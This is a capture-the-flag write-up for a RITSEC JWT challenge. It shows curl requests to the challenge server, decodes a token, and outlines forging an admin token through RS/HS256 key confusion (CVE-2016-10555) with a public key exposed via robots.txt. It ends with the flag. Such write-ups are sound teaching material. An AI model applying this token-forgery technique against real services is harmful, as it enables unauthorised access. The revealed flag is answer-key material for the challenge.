#### Challenge:

```
ctfchallenges.ritsec.club:3000
ctfchallenges.ritsec.club:4000
```

Hint: You don't need the Bearer keyword!

---

#### Solution:

The link `http://ctfchallenges.ritsec.club:3000` returns:

```
This page is only for authentication with our api, located at port 4000!
```

The link `http://ctfchallenges.ritsec.club:4000` returns:

```
API Documentation

Below are some of the api endpoints that you can use. Please use them responsibly :)!
Use the format below to make your requests to the API.

Nodes 	Description
/api/admin

    For admin users to authenticate. Please provide us your authorization token given to you by the /auth endpoint.

/api/normal

    For standard users to authenticate. Please provide us your authorization token given to you by the /auth endpoint.

/auth

    Authentication endpoint on port 3000. Please send your name and this api will return your token for accessing the api!
```

After generating access token via `/auth` endpoint we get an `JWT` token:

```bash
TOKEN=$(curl -sS 'http://ctfchallenges.ritsec.club:3000/auth?name=user' | jq -r '.token');

echo $TOKEN
echo $TOKEN | base64 -di
```

```bash
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJuYW1lIjoidXNlciIsInR5cGUiOiJhZG1pbiIsImlhdCI6MTU3Mzg2MTUyNn0.ZWozILI1krYPnizFIayZn-Bya0RmFyYKjNrxTBA57Xk
{"typ":"JWT","alg":"HS256"}{"name":"user","type":"admin","iat":1573861526}Z��,�d����1Hk&g&�Far`����base64: invalid input
```

With this token we are able to authenticate at `/api/normal` endpoint (note: send the token in `Authorization` header without the `Bearer` keyword) to get response:

```bash
curl -sS 'http://ctfchallenges.ritsec.club:4000/api/normal' -H "Authorization: $TOKEN"
```

```bash
{"flag":"Congrats on authenticating! Too bad flags aren't for normal users !!"}
```

Trying that on the `/api/admin` gets us `403` (even with trying the `(CVE-2015-2951) The alg=none signature-bypass vulnerability`):


```bash
{"reason":"Not an admin!"}
```

So we need to use the `(CVE-2016-10555) The RS/HS256 public key mismatch vulnerability` same way as in [File Rover challenge](../../challenges.reply.com/filerover/README.md ":ignore"), but for that, we need the public key but the endpoints are plain old HTTP. Luckily, we noticed that in the source code of `http://ctfchallenges.ritsec.club:4000`, there is a hint:

```html
<!-- Robots can help you with the api -->
```

Checking the `http://ctfchallenges.ritsec.club:3000/robots.txt` we get:

```yaml
User-agent: *
Disallow: /signing.pem
Disallow: /auth
```

With the `signing.pem` and the `"normal user token"` we can use the
[jwt_tool](https://github.com/ticarpi/jwt_tool) the same way as in the [File Rover challenge](../../challenges.reply.com/filerover/README.md ":ignore") and send the forged admin token to the `/api/admin` endpoint to finally get the flag.

---

<details><summary>FLAG:</summary>

```
RITSEC{JWT_th1s_0ne_d0wn}
```

</details>
<br/>
